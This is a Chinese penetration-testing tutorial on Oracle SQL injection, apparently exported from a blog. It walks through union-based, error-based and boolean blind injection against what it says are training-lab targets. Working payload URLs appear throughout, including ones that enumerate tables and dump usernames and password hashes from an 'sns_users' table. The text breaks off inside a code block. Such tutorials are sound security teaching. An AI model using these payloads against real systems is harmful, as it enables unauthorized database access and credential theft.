总结</h1><p>Oracle数据库注入跟日常的注入其实没有什么太大的分别，需要注意数据类型的一致性和常用表名列名的不同即可，在sql注入的原理上都是拼接sql语句并执行。在实战中企业还是有很大部分使用Oracle数据库，故在此进行分析总结，希望能够对渗透测试人员有所帮助。<br>以上测试靶场采用墨者学院Oracle注入靶场、掌控安全Oralce注入靶场以及本地搭建的Oracle数据库，在实战中可能会遇到waf等安全设备的拦截，后续将针对Oracle数据库waf绕过编写一篇文章，敬请期待ing～</p>\n","site":{"data":{"link":[{"class_name":"友情鏈接","class_desc":"那些人，那些事","link_list":[{"name":"Hexo","link":"https://hexo.io/zh-tw/","avatar":"https://d33wubrfki0l68.cloudfront.net/6657ba50e702d84afb32fe846bed54fba1a77add/827ae/logo.svg","descr":"快速、簡單且強大的網誌框架"}]},{"class_name":"網站","class_desc":"值得推薦的網站","link_list":[{"name":"Youtube","link":"https://www.youtube.com/","avatar":"https://i.loli.net/2020/05/14/9ZkGg8v3azHJfM1.png","descr":"視頻網站"},{"name":"Weibo","link":"https://www.weibo.com/","avatar":"https://i.loli.net/2020/05/14/TLJBum386vcnI1P.png","descr":"中國最大社交分享平台"},{"name":"Twitter","link":"https://twitter.com/","avatar":"https://i.loli.net/2020/05/14/5VyHPQqR6LWF39a.png","descr":"社交分享平台"}]}]}},"excerpt":"","more":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9940\">https://xz.aliyun.com/t/9940</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>在渗透测试过程中，总是遇到不熟悉的数据库，知道了有SQL注入漏洞但是无法利用，这总让我很苦恼。因为网上的文章很多都是基于Mysql数据库的，当遇到Oracle数据库时有些数据库层面的不同点对于我们测试总会有点困扰，无法成功利用。故学习了Oracle数据库注入的相关知识，在此总结分享给大家，希望能够对安全从业人员有所帮助。<br>全文基于对于SQL注入具有一定理解，并且能够在Mysql数据库进行注入的基础上进行阐述。本文旨在讲述Oracle数据库多种情况下如何进行注入，注重实战，相关概念问题请自行查阅资料，谢谢理解～</p>\n<h1 id=\"0x02-注入点确定\"><a href=\"#0x02-注入点确定\" class=\"headerlink\" title=\"0x02 注入点确定\"></a>0x02 注入点确定</h1><p>跟其他数据库一样，检测注入点都是可以通过拼接and语句进行判断。这里通过and 1=1 和and 1=2进行判断。实战中还可以通过延时函数进行判断。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20and%201=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353232047-3c17c5db-589b-4002-a82a-6fbe01e576fe.png#align=left&display=inline&height=439&margin=%5Bobject%2Object%5D&name=image.png&originHeight=878&originWidth=1608&size=122915&status=done&style=none&width=804\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20and%201=2</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353242702-ec873de8-7a5e-4bf6-b14f-3768ee4e8e76.png#align=left&display=inline&height=278&margin=%5Bobject%2Object%5D&name=image.png&originHeight=556&originWidth=1578&size=35308&status=done&style=none&width=789\" alt=\"image.png\"></p>\n<h1 id=\"0x03-显错注入\"><a href=\"#0x03-显错注入\" class=\"headerlink\" title=\"0x03 显错注入\"></a>0x03 显错注入</h1><h2 id=\"1、判断字段数为2\"><a href=\"#1、判断字段数为2\" class=\"headerlink\" title=\"1、判断字段数为2\"></a>1、判断字段数为2</h2><p>与其他注入一样，这里通过order by来判断字段数。因为order by 2页面正常，order by 3页面不正常，故判断当前字段数为2。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=1%20order%20by%202</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353279684-e0cc78c5-4353-4770-82e2-44b3b6176214.png#align=left&display=inline&height=420&margin=%5Bobject%2Object%5D&name=image.png&originHeight=840&originWidth=1458&size=116992&status=done&style=none&width=729\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353306166-7c477672-384f-4899-ab58-d487f859a22d.png#align=left&display=inline&height=220&margin=%5Bobject%2Object%5D&name=image.png&originHeight=440&originWidth=1412&size=29793&status=done&style=none&width=706\" alt=\"image.png\"></p>\n<h2 id=\"2、获取显错点\"><a href=\"#2、获取显错点\" class=\"headerlink\" title=\"2、获取显错点\"></a>2、获取显错点</h2><p>联合查询这里使用了union select，oracle数据库与mysql数据库不同点在于它对于字段点数据类型敏感，也就是说我们不能直接union select 1,2,3来获取显错点了，需要在字符型字段使用字符型数据，整型字段使用整型数据才可以。如下，两个字段都为字符型，故使用union select ‘null’,’null’。<br>(在有些情况下也采用union all select的形式进行联合查询。union all select与union select的不同点可以很容易理解为all表示输出所有，也就是当数据出现相同时，将所有数据都输出；union select则会将相同数据进行过滤，只输出其中一条。)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#联合查询</span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select null,null from dual</span><br><span class=\"line\">#修改null为&#x27;null&#x27;，判断字段类型均为字符型</span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,&#x27;null&#x27; from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353537650-e294e0ca-44d5-4884-9341-27dd41eff277.png#align=left&display=inline&height=500&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1000&originWidth=2526&size=171188&status=done&style=none&width=1263\" alt=\"image.png\"><br>后续便可以替换显错点进行注入。</p>\n<h2 id=\"3、查询数据库版本信息\"><a href=\"#3、查询数据库版本信息\" class=\"headerlink\" title=\"3、查询数据库版本信息\"></a>3、查询数据库版本信息</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select banner from sys.v_$version where rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<h2 id=\"4、获取当前数据库连接用户\"><a href=\"#4、获取当前数据库连接用户\" class=\"headerlink\" title=\"4、获取当前数据库连接用户\"></a>4、获取当前数据库连接用户</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select sys_context(&#x27;userenv&#x27;,&#x27;current_user&#x27;) from dual) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;1&#x27;,user from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354142760-9af3da8c-9eb3-4592-9c52-24a10e962061.png#align=left&display=inline&height=347&margin=%5Bobject%2Object%5D&name=image.png&originHeight=694&originWidth=2492&size=123811&status=done&style=none&width=1246\" alt=\"image.png\"></p>\n<h2 id=\"5、查询当前数据库库名\"><a href=\"#5、查询当前数据库库名\" class=\"headerlink\" title=\"5、查询当前数据库库名\"></a>5、查询当前数据库库名</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select instance_name from V$INSTANCE) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354254697-9084c0a1-02ea-4da6-8f68-b579e31135fd.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=2510&size=123816&status=done&style=none&width=1255\" alt=\"image.png\"></p>\n<h2 id=\"6、查询数据库表名\"><a href=\"#6、查询数据库表名\" class=\"headerlink\" title=\"6、查询数据库表名\"></a>6、查询数据库表名</h2><p>查询表名一般查询admin或者user表</p>\n<h3 id=\"直接查询\"><a href=\"#直接查询\" class=\"headerlink\" title=\"直接查询\"></a>直接查询</h3><p>获取第一个表名<strong>LOGMNR_SESSION_EVOLVE$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353844960-cad323f3-f77c-4c12-b1e8-9250896245b8.png#align=left&display=inline&height=254&margin=%5Bobject%2Object%5D&name=image.png&originHeight=508&originWidth=1252&size=21553&status=done&style=none&width=626\" alt=\"image.png\"><br>获取第二个表名<strong>LOGMNR_GLOBAL$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627353863561-54f3d94e-8596-40c9-9f49-d2520256d80f.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&name=image.png&originHeight=476&originWidth=1166&size=18009&status=done&style=none&width=583\" alt=\"image.png\"><br>获取第三个表名<strong>LOGMNR_GT_TAB_INCLUDE$</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where rownum=1 and table_name not in &#x27;LOGMNR_SESSION_EVOLVE$&#x27; and table_name not in &#x27;LOGMNR_GLOBAL$&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<h3 id=\"模糊搜索查询\"><a href=\"#模糊搜索查询\" class=\"headerlink\" title=\"模糊搜索查询\"></a>模糊搜索查询</h3><p>获取sns_users表名</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select table_name from user_tables where table_name like &#x27;%user%&#x27; and rownum=1) from dual</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627354561532-baf25308-92eb-42f2-bc57-e95ddd2b1891.png#align=left&display=inline&height=346&margin=%5Bobject%2Object%5D&name=image.png&originHeight=692&originWidth=2496&size=125987&status=done&style=none&width=1248\" alt=\"image.png\"></p>\n<h2 id=\"7、查询数据库列名\"><a href=\"#7、查询数据库列名\" class=\"headerlink\" title=\"7、查询数据库列名\"></a>7、查询数据库列名</h2><h3 id=\"直接查询-1\"><a href=\"#直接查询-1\" class=\"headerlink\" title=\"直接查询\"></a>直接查询</h3><p>获取sns_users表里的字段</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27;) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27;) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">……………</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where rownum=1 and column_name not in &#x27;USER_NAME&#x27; and column_name not in &#x27;AGENT_NAME&#x27; and column_name not in &#x27;PROTOCOL&#x27; and column_name not in &#x27;SPARE1&#x27; and column_name not in &#x27;DB_USERNAME&#x27; and column_name not in &#x27;OID&#x27; and column_name &lt;&gt; &#x27;EVENTID&#x27; and column_name &lt;&gt; &#x27;NAME&#x27; and column_name &lt;&gt; &#x27;TABLE_OBJNO&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">获取如下字段：</span><br><span class=\"line\">USER_NAME</span><br><span class=\"line\">AGENT_NAME</span><br><span class=\"line\">PROTOCOL</span><br><span class=\"line\">SPARE1</span><br><span class=\"line\">DB_USERNAME</span><br><span class=\"line\">OID</span><br><span class=\"line\">EVENTID</span><br><span class=\"line\">NAME</span><br><span class=\"line\">TABLE_OBJNO</span><br><span class=\"line\">USAGE</span><br><span class=\"line\">USER_PWD</span><br><span class=\"line\">…………</span><br></pre></td></tr></table></figure>\n<h3 id=\"模糊搜索查询-1\"><a href=\"#模糊搜索查询-1\" class=\"headerlink\" title=\"模糊搜索查询\"></a>模糊搜索查询</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27;) from dual</span><br><span class=\"line\"></span><br><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select &#x27;null&#x27;,(select column_name from user_tab_columns where table_name=&#x27;sns_users&#x27; and rownum=1 and column_name like &#x27;%USER%&#x27; and column_name &lt;&gt; &#x27;USER_NAME&#x27;) from dual</span><br></pre></td></tr></table></figure>\n<h2 id=\"8、查询数据库数据\"><a href=\"#8、查询数据库数据\" class=\"headerlink\" title=\"8、查询数据库数据\"></a>8、查询数据库数据</h2><p>获取账号密码字段内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355758027-eb920ce1-1667-40c4-9703-bf055011ce09.png#align=left&display=inline&height=332&margin=%5Bobject%2Object%5D&name=image.png&originHeight=664&originWidth=2436&size=124453&status=done&style=none&width=1218\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355803061-53c045a9-600d-4231-911b-a0b145fd8d32.png#align=left&display=inline&height=308&margin=%5Bobject%2Object%5D&name=image.png&originHeight=616&originWidth=2470&size=127349&status=done&style=none&width=1235\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:43469/new_list.php?id=-1 union select USER_NAME,USER_PWD from &quot;sns_users&quot; where rownum=1 and USER_NAME &lt;&gt; &#x27;zhong&#x27; and USER_NAME not in &#x27;hu&#x27;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355829407-d770aa94-c339-4686-8131-9c5b9910039e.png#align=left&display=inline&height=288&margin=%5Bobject%2Object%5D&name=image.png&originHeight=576&originWidth=2436&size=121972&status=done&style=none&width=1218\" alt=\"image.png\"><br>解密获取密码392118<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627355905460-f2485164-b4a8-4419-a99f-9752107804b7.png#align=left&display=inline&height=390&margin=%5Bobject%2Object%5D&name=image.png&originHeight=780&originWidth=1526&size=108851&status=done&style=none&width=763\" alt=\"image.png\"></p>\n<h2 id=\"9、美化输出\"><a href=\"#9、美化输出\" class=\"headerlink\" title=\"9、美化输出\"></a>9、美化输出</h2><p>Oracle采用||进行数据连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=-1 union select &#x27;用户名：&#x27;||USER_NAME,&#x27;密码：&#x27;||USER_PWD from &quot;sns_users&quot; where rownum=1</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627356270321-022d9ac4-944b-4251-9f20-fa13afadd1b9.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=2512&size=124098&status=done&style=none&width=1256\" alt=\"image.png\"></p>\n<h1 id=\"0x04-报错注入\"><a href=\"#0x04-报错注入\" class=\"headerlink\" title=\"0x04 报错注入\"></a>0x04 报错注入</h1><p>报错注入是一种通过函数报错前进行子查询获取数据，再通过错误页面回显的一种注入手法，下面介绍几种报错注入函数以及获取一些常见的获取数据，实际操作只需要将子查询内的查询语句进行替换即可。</p>\n<h2 id=\"1、ctxsys-drithsx-sn\"><a href=\"#1、ctxsys-drithsx-sn\" class=\"headerlink\" title=\"1、ctxsys.drithsx.sn()\"></a>1、ctxsys.drithsx.sn()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取当前数据库用户 ORACLE1</span><br><span class=\"line\">?id=1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370671892-ba68c50c-4b25-48c6-8121-2ee170485de9.png#align=left&display=inline&height=357&margin=%5Bobject%2Object%5D&name=image.png&originHeight=714&originWidth=2512&size=177516&status=done&style=none&width=1256\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v_$version where rownum=1)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370745612-670ae342-fb32-42ff-8b48-bd894e0b6d3f.png#align=left&display=inline&height=341&margin=%5Bobject%2Object%5D&name=image.png&originHeight=682&originWidth=2492&size=195982&status=done&style=none&width=1246\" alt=\"image.png\"></p>\n<h2 id=\"2、XMLType\"><a href=\"#2、XMLType\" class=\"headerlink\" title=\"2、XMLType()\"></a>2、XMLType()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464280011-c070c8c1-5831-4516-93a5-d9de8e4728b2.png#align=left&display=inline&height=466&margin=%5Bobject%2Object%5D&name=image.png&originHeight=932&originWidth=1860&size=83611&status=done&style=none&width=930\" alt=\"image.png\"></p>\n<h2 id=\"3、dbms-xdb-version-checkin\"><a href=\"#3、dbms-xdb-version-checkin\" class=\"headerlink\" title=\"3、dbms_xdb_version.checkin()\"></a>3、dbms_xdb_version.checkin()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.checkin((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627370853172-60c1003a-f2bc-45e7-88e4-e1dc5b544009.png#align=left&display=inline&height=352&margin=%5Bobject%2Object%5D&name=image.png&originHeight=704&originWidth=2466&size=181678&status=done&style=none&width=1233\" alt=\"image.png\"></p>\n<h2 id=\"4、bms-xdb-version-makeversioned\"><a href=\"#4、bms-xdb-version-makeversioned\" class=\"headerlink\" title=\"4、bms_xdb_version.makeversioned()\"></a>4、bms_xdb_version.makeversioned()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取当前数据库用户 ORACLE1</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371068298-bf405b32-0774-4999-b59c-5f972ff993eb.png#align=left&display=inline&height=299&margin=%5Bobject%2Object%5D&name=image.png&originHeight=598&originWidth=2500&size=157266&status=done&style=none&width=1250\" alt=\"image.png\"></p>\n<h2 id=\"5、dbms-xdb-version-uncheckout\"><a href=\"#5、dbms-xdb-version-uncheckout\" class=\"headerlink\" title=\"5、dbms_xdb_version.uncheckout()\"></a>5、dbms_xdb_version.uncheckout()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (select dbms_xdb_version.uncheckout((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371151615-1dc8551d-bb05-4b01-ab12-fb20b684f7b1.png#align=left&display=inline&height=305&margin=%5Bobject%2Object%5D&name=image.png&originHeight=610&originWidth=2464&size=184586&status=done&style=none&width=1232\" alt=\"image.png\"></p>\n<h2 id=\"6、dbms-utility-sqlid-to-sqlhash\"><a href=\"#6、dbms-utility-sqlid-to-sqlhash\" class=\"headerlink\" title=\"6、dbms_utility.sqlid_to_sqlhash()\"></a>6、dbms_utility.sqlid_to_sqlhash()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#获取数据库版本信息</span><br><span class=\"line\">?id=1 and (SELECT dbms_utility.sqlid_to_sqlhash((select banner from sys.v_$version where rownum=1)) from dual) is not null --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627371240951-badc7016-575d-4a23-9d5b-24d99923c150.png#align=left&display=inline&height=306&margin=%5Bobject%2Object%5D&name=image.png&originHeight=612&originWidth=2500&size=190889&status=done&style=none&width=1250\" alt=\"image.png\"></p>\n<h2 id=\"7、ordsys-ord-dicom-getmappingxpath\"><a href=\"#7、ordsys-ord-dicom-getmappingxpath\" class=\"headerlink\" title=\"7、ordsys.ord_dicom.getmappingxpath()\"></a>7、ordsys.ord_dicom.getmappingxpath()</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and 1=ordsys.ord_dicom.getmappingxpath((select banner from sys.v_$version where rownum=1),user,user)--</span><br></pre></td></tr></table></figure>\n<h2 id=\"8、utl-inaddr\"><a href=\"#8、utl-inaddr\" class=\"headerlink\" title=\"8、utl_inaddr.*()\"></a>8、utl_inaddr.*()</h2><p>utl_inaddr（用于取得局域网或Internet环境中的主机名和IP地址）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627369182388-db5976e4-c62c-460c-a76e-4a3b9fdadf0e.png#align=left&display=inline&height=444&margin=%5Bobject%2Object%5D&name=image.png&originHeight=888&originWidth=1480&size=138926&status=done&style=none&width=740\" alt=\"image.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 and 1=utl_inaddr.get_host_name((select user from dual)) --</span><br><span class=\"line\">?id=1 and 1=utl_inaddr.get_host_address((select user from dual)) --</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464133762-13bb4b59-3f8f-466a-b970-082352b0484e.png#align=left&display=inline&height=398&margin=%5Bobject%2Object%5D&name=image.png&originHeight=796&originWidth=1692&size=57659&status=done&style=none&width=846\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627464181708-702fd815-478b-488f-8c3a-565adb5fb2f4.png#align=left&display=inline&height=458&margin=%5Bobject%2Object%5D&name=image.png&originHeight=916&originWidth=1810&size=65997&status=done&style=none&width=905\" alt=\"image.png\"></p>\n<h1 id=\"0x05-布尔型盲注\"><a href=\"#0x05-布尔型盲注\" class=\"headerlink\" title=\"0x05 布尔型盲注\"></a>0x05 布尔型盲注</h1><p>常用猜解：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#猜长度</span><br><span class=\"line\">?id=1 and 6=(select length(user) from dual)--</span><br><span class=\"line\">#截取值猜ascii码</span><br><span class=\"line\">?id=1 and (select ascii(substr(user,1,1)) from dual)&gt;83</span><br><span class=\"line\">?id=1 and (select ascii(substr(user,1,1)) from dual)=83</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627358275597-570e4d7d-7594-4570-bd79-ff983c61706e.png#align=left&display=inline&height=380&margin=%5Bobject%2Object%5D&name=image.png&originHeight=760&originWidth=2404&size=187790&status=done&style=none&width=1202\" alt=\"image.png\"></p>\n<h2 id=\"1、decode函数布尔盲注\"><a href=\"#1、decode函数布尔盲注\" class=\"headerlink\" title=\"1、decode函数布尔盲注\"></a>1、decode函数布尔盲注</h2><p>decode(字段或字段的运算，值1，值2，值3）<br>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3</p>\n<h3 id=\"测试用户名长度\"><a href=\"#测试用户名长度\" class=\"headerlink\" title=\"测试用户名长度\"></a>测试用户名长度</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 6=(select length(user) from dual) --</span><br></pre></td></tr></table></figure>\n<h3 id=\"测试当前用户是否为SYSTEM\"><a href=\"#测试当前用户是否为SYSTEM\" class=\"headerlink\" title=\"测试当前用户是否为SYSTEM\"></a>测试当前用户是否为SYSTEM</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#如果是system用户则返回正常，不是则返回不正常</span><br><span class=\"line\">http://219.153.49.228:44768/new_list.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- </span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 